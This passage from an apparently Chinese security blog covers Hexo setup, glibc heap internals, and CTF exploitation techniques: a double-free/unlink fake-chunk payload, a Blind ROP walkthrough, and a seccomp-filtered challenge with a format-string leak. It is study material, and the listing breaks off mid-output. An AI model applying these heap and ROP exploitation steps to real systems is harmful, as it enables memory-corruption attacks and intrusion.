</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> hexo init limedroid.github.io</span><br><span class="line"><span class="meta">$</span> cd limedroid.github.io</span><br><span class="line"><span class="meta">$</span> npm install</span><br></pre></td></tr></table></figure>
<h2 id="更换喜欢的主题"><a href="#更换喜欢的主题" class="headerlink" title="更换喜欢的主题"></a>更换喜欢的主题</h2><pre><code>找到相应的主题
git clone https://github.com/iissnan/hexo-theme-next themes/next
到本地
更改根目录下的_config.yml
theme: 新主题的名字
</code></pre><h2 id="进行预览"><a href="#进行预览" class="headerlink" title="进行预览"></a>进行预览</h2><pre><code>分为清除编译预览三部分。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
<h2 id="进行部署"><a href="#进行部署" class="headerlink" title="进行部署"></a>进行部署</h2><pre><code>部署需要做相应的准备，打开根目录下的_config.yml，将最后一部分改为如下格式
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt;</span><br><span class="line">  branch: [branch]</span><br></pre></td></tr></table></figure>
<p>注意冒号后要加上空格</p>
<p>然后执行命令部署</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>git需要添加用户和邮箱才能执行成功，网址为<a href="https://another1024.github.io/" target="_blank" rel="noopener">https://another1024.github.io/</a></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="主arena"><a href="#主arena" class="headerlink" title="主arena"></a>主arena</h1><pre><code>heap和arena
根据他们在堆中出现的次序，第一个是heap_info，即Heap这个结构的元数据，即它本身拥有的用来指示在它上面的操作的数据。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _heap_info &#123;</span><br><span class="line">mstate ar_ptr; /* 这个heap所在的arena */</span><br><span class="line">struct _heap_info *prev; /* 上一个heap */</span><br><span class="line">size_t size; /* 字节为单位的当前大小 */</span><br><span class="line">char pad[-5 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; /* 用于对齐 */ </span><br><span class="line">&#125;heap_info;</span><br></pre></td></tr></table></figure>
<pre><code>从这个结构当中，
我们可以推断出heap和arena是有一个对应关系的，
以及prev指针说明了heap本身是由一个链表连接的，
事实上是一个循环单链表。
</code></pre><h1 id="state结构"><a href="#state结构" class="headerlink" title="state结构"></a>state结构</h1><pre><code>或者叫mstate，
虽然名称似乎和arena没有关系，
但是其实这个结构是用来表示arena的。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state &#123;</span><br><span class="line">mutex_t mutex; /* 同步访问相关，互斥锁 */</span><br><span class="line">int flags; /* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */</span><br><span class="line">mfastbinptr fastbins[NFASTBINS]; /* fastbins，之后会说到,是一个chunk的链表 */</span><br><span class="line">mchunkptr top; /* top chunk，一个特殊的chunk，在之后会说到 */</span><br><span class="line">mchunkptr last_remainder; /* 最后一次拆分top chunk得到的剩余内容，之后会说到 */</span><br><span class="line">mchunkptr bins[BINS * 2]; /* bins，一个chunk的链表的数组，之后会说到 */</span><br><span class="line">unsigned int binmap[BINMAPSIZE]; /* bins是否为空的一个位图 */</span><br><span class="line">struct malloc_state *next; /* 链表，下一个malloc_state的位置 */</span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h2><pre><code>用来保证同步，在调用一个函数，比如malloc的时候，
其实调用的是public_xxx的函数，
而这个函数的认为就是先试图进行加锁，
这个锁就是这里的mutex了，然后再调用_int_xxx函数，
这个函数才是真正的内部实现。
</code></pre><h2 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h2><pre><code>用来表示一些当前arena的特征，比如是否有fastbin chunk存在，内存是否是非连续的等等。
</code></pre><h2 id="fasbins-…"><a href="#fasbins-…" class="headerlink" title="fasbins[…]"></a>fasbins[…]</h2><pre><code>这个数组存的是fastbin的链表，
每一个数组中的元素对应一个fastbin的链表，
bin为chunk的链表，保存没有被使用的chunk，
用来避免多次使用系统调用分配。总共有4种bin，
包括fastbin,small bin, large bin和unsorted bin,
主要用于分配，在分配的时候，会根据大小去查找到相应的bin，
然后通过在bin中删除某一个块来进行分配。
Fastbin是4种bin中唯一使用单链表表示的bin
</code></pre><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><pre><code>top chunk，较为特殊的一个chunk，
虽然其数据结构(后文会谈到的chunk的结构)和一般chunk无异，
但是他相当于堆可用内存的一个边界，
是唯一一个可以自行增长的chunk，
每当在各个bin当中去找空余的内存找不到的时候就会来这儿取一个块，
剩下的就是remainder块，也是新的top块
</code></pre><h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last_remainder"></a>last_remainder</h2><pre><code>上面的top chunk已经谈到了，
其实就是从top chunk当中分出去之后剩下的那一个块
</code></pre><h2 id="bins-…"><a href="#bins-…" class="headerlink" title="bins[…]"></a>bins[…]</h2><pre><code>在fastbin的解释当中我们提到了有4种bin，
由于只有fastbin是单链表表示，所以fastbin是单独表示的，
其他bin则都使用了这个bins数组，下标1是unsorted bin，
2到63是small bin，64到126是large bin，共126个bin。
</code></pre><h2 id="bitmap-…"><a href="#bitmap-…" class="headerlink" title="bitmap[…]"></a>bitmap[…]</h2><pre><code>表示bin数组当中某一个下标的bin是否为空，
用来在分配的时候加速 .next 
下一个arena，是一个循环单链表
</code></pre><h2 id="system-mem和max-system-mem"><a href="#system-mem和max-system-mem" class="headerlink" title="system_mem和max_system_mem"></a>system_mem和max_system_mem</h2><pre><code>用来跟踪当前被系统分配的内存总量，
INTERNAL_SIZE_T数据类型在大多数系统上都是size_t
</code></pre><h1 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h1><hr>
<p>32位中chunk结构为</p>
<p>4字节前一个堆块大小</p>
<p>4字节本堆块size（最后三位flag）</p>
<p>快表中</p>
<p>[</p>
<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
<p>]</p>
<p>非快表</p>
<p>[</p>
<p>4字节（不使用堆块的情况下前一个堆块指针）</p>
<p>4字节（不使用堆块的情况下后一个堆块指针）</p>
<p>]</p>
<p>64位翻倍</p>
<h1 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h1><hr>
<pre><code>第一步：如果进程没有关联的分配区，
就通过sysmalloc从操作系统分配内存mmap 

第二步：从fastbin查找对应大小的chunk并返回（效验下一块是否存在），
如果失败进入第三步。 

第三步：从smallbin查找对应大小的chunk并返回,
如果分配失败将fastbin中的空闲chunk合并放入unsortedbin中，
进入第四步。
（如果前一个空闲则unlink前一个然后合并，
然后检查下一个是否空闲。
如果相邻的下一个chunk不是top chunk，
并且下一个chunk不在使用中，
就继续合并，否则，就清除下一个chunk的PREV_INUSE，
表示该chunk已经空闲了。 然后将刚刚合并完的chunk添加进unsorted_bin中，
unsorted_bin也是一个双向链表。 ） 

第四步：遍历unsortedbin，
从unsortedbin中查找对应大小的chunk
并返回如果满足拆开的大小则拆成两部分，
后面部分放回unsortedbin，
根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。
进入第五步。 

第五步：从largebin指定位置查找对应大小的chunk并返回，
如果失败进入第六步。 

第六步：从largebin中大于指定位置的双向链表中
查找对应大小的chunk并返回，如果失败进入第七步。 

第七步：从topchunk中分配对应大小的chunk并返回，
topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk
如果有，就合并fastbin中的chunk并加入到unsortedbin中，
然后跳回第四步。如果fastbin中没有空闲chunk，
就通过sysmalloc从操作系统分配内存。

sysmalloc先试图扩大top chunk，如果失败就申请一个新的topchunk
并释放原来的topchunk。如果申请新的则扩大阈值
</code></pre><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><hr>
<pre><code>下面对整个_int_free函数做个总结。 
首先检查将要释放的chunk是否属于fastbin，
如果属于就将其添加到fastbin中
（检查下一块的大小是    否为合理的数值）。 
然后检查该chunk是否是由mmap分配的，
如果不是找前一个unlink合并，
就根据其下一个chunk的类型添加到unsortedbin
或者合并到top chunk中。 
接着，如果释放的chunk的大小大于一定的阀值，
就需要通过systrim缩小主分配区的大小，
或者通过heap_trim缩小非主分配区的大小。
 （检查unsortbin是否完好无损）
最后如果该chunk是由mmap的分配的，
通过munmap_chunk释放。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/doublefree/">double free</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="double-free-利用"><a href="#double-free-利用" class="headerlink" title="double free 利用"></a>double free 利用</h1><p>unlink漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure></p>
<pre><code>这里在宏中传入参数FD，BK，P分别是指向后一个，
前一个，还有当前的chunk。很经典的链表节点删除，
溢出的话导致链表被改，所以有了保护。
当前内存块的上一块内存中指向下一块内存指针和
当前内存块的下一块内存块的指向上一块内存块的指针
如果不是指向当前内存块的话，程序就会崩溃退出。
</code></pre><h1 id="漏洞的原理"><a href="#漏洞的原理" class="headerlink" title="漏洞的原理"></a>漏洞的原理</h1><pre><code>要利用Double Free的漏洞。我们就要让系统进行unlink的操作，
达到篡改指针的目的。但是一般的情况下，
我们两次释放同一块内存会被操作系统给检测出来，
怎么欺骗过操作系统才是最重要的。
</code></pre><p>假设程序申请了两个堆块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;malloc(504)</span><br><span class="line">&gt;malloc(512)</span><br></pre></td></tr></table></figure></p>
<pre><code>然后释放这2块内存。这样子我们就可以在距离
第一个指针偏移量为0x200的地方有了一个野指针。
我们留下了一个野指针p指向偏移为0x200的地方。
然后我们需要做的就是伪造chunk。再free野指针p。
首先是申请一块更大的内存，
大小应该等于我们刚才申请的内存的总和。
</code></pre><blockquote>
<p>malloc(768)<br>    最好和刚才2块内存大小总和一样，如果不一样大也也可以，<br>    就是待会伪造第二快内存块的大小的时候，<br>    要让伪造的大小等于我们申请的chunk的大小，<br>    否则会无法绕过检查。会被系统检查出double free。</p>
</blockquote>
<p>然后这是我在第二次申请的内存中填入的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;0x0 + 0x1f9 + 0x0804bfc0 - 0xc + 0x0804bfc0 - 0x8 + &apos;a&apos;*(0x200-24) + 0x000001f8 + 0x108</span><br></pre></td></tr></table></figure>
<pre><code>接着释放野指针，除法unlink可以绕过检查，让指针指向自己前面的地址。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/brop/">brop</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="BROP的使用环境："><a href="#BROP的使用环境：" class="headerlink" title="BROP的使用环境："></a>BROP的使用环境：</h2><pre><code>不能直接构造ROP gadget
目标服务在崩溃后会重新运行
</code></pre><h2 id="Canary不会重置，没有ASLR"><a href="#Canary不会重置，没有ASLR" class="headerlink" title="Canary不会重置，没有ASLR"></a>Canary不会重置，没有ASLR</h2><pre><code>这是因为Blind ROP其实核心部分都是类似于爆破的概念，  
因此会不断的引起目标服务崩溃，挂起，如果崩溃后不能重新启动，  
且启动后Canary或者其他地址改变，那么之前的爆破也就无意义了。  
那么BROP每一步在做什么呢。
</code></pre><h2 id="爆破Canary："><a href="#爆破Canary：" class="headerlink" title="爆破Canary："></a>爆破Canary：</h2><pre><code>当我们获取到崩溃长度后，根据
Canary-&gt;EBP-&gt;Ret
的栈结构，我们可以开始爆破Canary，爆破的方法就是一字节一字节爆破。
</code></pre><h2 id="获取Hang-addr和PLT："><a href="#获取Hang-addr和PLT：" class="headerlink" title="获取Hang addr和PLT："></a>获取Hang addr和PLT：</h2><pre><code>随后就是找hang gadget了，这个也叫stop gadget。
这种特殊的地址，既不会造成Nginx崩溃，也不会造成Nginx返回内容，
而是让进程进入无限循环，挂起或者sleep的状态，
它是我们后面寻找BROP gadget的重要依据。
plt的原理和hang gadget很像。
在这之前我大概说一下为什么找plt的原理和hang gadget很像。
plt项是连续的，而且在0字节，和6字节之后执行的内容都会正常进入后续处理，
而不会崩溃或有返回，因此只要连续有多个16字节都会让进程block且每个16字节地址+6之后，
也会block，那么这就有可能是个plt项。
</code></pre><h2 id="找到BROP-gadget："><a href="#找到BROP-gadget：" class="headerlink" title="找到BROP gadget："></a>找到BROP gadget：</h2><pre><code>接下来，有了hang gadget，我们就可以找到BROP gadget了，这个BROPgadget，是我们组成在开头提到通过write方法dump内存的重要部分，
和ROP gadget的概念很像，为了组成这个write函数，需要三个参数，
也就是需要三个ROP gadget：
pop rdi,ret; 
pop rsi,ret;  
pop rdx,ret;
因为在64位Linux中，参数不是靠push寄存器入栈决定的，
而是由寄存器本身决定的，这三个参数对应的就是rdi，rsi和rdx寄存器中的内容。
因此我们利用hang gadget来暴力搜索这些BROPgadget，如何判断呢？
在ret后放很多hangaddr，只要命中pop ret，pop pop ret这种gadget，都会进入block状态，通过这种方法，我们找到6个pop ret，就能找到一个在linux下常见的结构，通过计算这个结构的偏移，
就能得到pop rsi,ret和pop rdi,ret了。
</code></pre><h2 id="找到strcmp-plt和write-plt"><a href="#找到strcmp-plt和write-plt" class="headerlink" title="找到strcmp plt和write plt"></a>找到strcmp plt和write plt</h2><pre><code>这一步完成后，我们就需要进行strcmp和write对应plt项的查找了，
为什么要找strcmp呢，因为strcmp的汇编功能是对rdx赋予一个长度值，
通过这种方法可以对rdx，
也就是第三个参数赋值，因为在.text字段中很难找到pop rdx,ret这样的gadget。
找这两个plt项，需要利用这两个plt项的特性，
比如strcmp就是对比两个字符串内容。如果两个字符串相等，
没有崩溃，且不相等，crash的话，这就是一个strcmp。
</code></pre><h2 id="Dump内存，执行shellcode"><a href="#Dump内存，执行shellcode" class="headerlink" title="Dump内存，执行shellcode"></a>Dump内存，执行shellcode</h2><pre><code>跳出内存完成正常攻击，
或者使用libcdatabase找出libc版本
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/bpf/">bpf</a></h1>
  

    </header>
    <div class="entry">
      
        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">  fd = open(<span class="string">"flag.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">short</span> v19;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">char</span>* secret;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  sercet = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (!secret)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  v8 = read(fd, secret, <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (v8 == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  secret[v8] = <span class="number">0</span>;</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//seccomp BPF</span></span><br><span class="line">  v19 = <span class="number">32</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">4</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">-1073741762</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">32</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">21</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">1</span>;</span><br><span class="line">  v38 = <span class="number">231</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v43 = <span class="number">21</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">6</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">2147418112</span>;</span><br><span class="line">  v51 = <span class="number">21</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">6</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">2147418112</span>;</span><br><span class="line">  v59 = <span class="number">21</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">1</span>;</span><br><span class="line">  v62 = <span class="number">1</span>;</span><br><span class="line">  v63 = <span class="number">6</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">2147418112</span>;</span><br><span class="line">  v67 = <span class="number">21</span>;</span><br><span class="line">  v68 = <span class="number">0</span>;</span><br><span class="line">  v69 = <span class="number">1</span>;</span><br><span class="line">  v70 = <span class="number">3</span>;</span><br><span class="line">  v71 = <span class="number">6</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">2147418112</span>;</span><br><span class="line">  v75 = <span class="number">6</span>;</span><br><span class="line">  v76 = <span class="number">0</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v78 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">15</span>;</span><br><span class="line">  v17 = &amp;v19;</span><br><span class="line">  </span><br><span class="line">  seccomp_setup = <span class="number">0</span>;</span><br><span class="line">  v15 = &amp;v16;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">16</span>;i&gt;<span class="number">0</span>;i--) &#123;</span><br><span class="line">    v18[syscall(<span class="number">0</span>, <span class="number">0</span>, v18, <span class="number">96</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (!seccomp_setup) &#123;</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">0x1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">0x2</span>, v15))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(secret) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>; ;j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (v11 - <span class="number">1</span> == j)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_SHOW_FLAG;</span><br><span class="line">      <span class="keyword">if</span> (secret[j] != v18[j])</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(secret) == j)</span><br><span class="line">LABEL_SHOW_FLAG:</span><br><span class="line">      show_flag();</span><br><span class="line"></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1</span>, v18);</span><br><span class="line">    seccomp_setup = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>所以，二进制文件加载“secret.txt”，
如果我们发送正确的秘密，我们将会得到该标志的奖励。
我在工作目录中创建了“secret.txt”和“flag.txt”，
并在执行二进制文件时发现存在格式字符串漏洞。
我们可以用“％p％p％s”泄漏正确的秘密，
因为指向秘密的指针位于堆栈中。不那么容易:)格式字符串存在，
但输出打印到stderr。因此，不可能将其远程泄漏。
另外,启用FORTIFY_SOURCE可防止使用%n可写内存段。
您可能注意到SECCOMP过滤器正在堆栈中初始化。
我在运行时转储它并使用seccomp-tools反汇编规则
</code></pre><h1 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h1><p>从Linux SECCOMP手册页：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">              This value results in the SECCOMP_RET_DATA portion of the fil‐</span><br><span class="line">              ter&apos;s return value being passed to user space as the errno</span><br><span class="line">              value without executing the system call.</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump spec/binary/twctf-2016-diary</span><br><span class="line">dump出沙箱</span><br><span class="line">seccomp-tools disasm spec/data/twctf-2016-diary.bpf</span><br><span class="line">反汇编</span><br><span class="line">seccomp-tools asm spec/data/libseccomp.asm -f raw | seccomp-tools disasm -</span><br><span class="line">汇编</span><br><span class="line">#  line  CODE  JT   JF      K</span><br><span class="line"># =================================</span><br><span class="line">#  0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">#  0001: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0003</span><br><span class="line">#  0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0003: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0005</span><br><span class="line">#  0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0005: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0007</span><br><span class="line">#  0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line">#  0007: 0x15 0x00 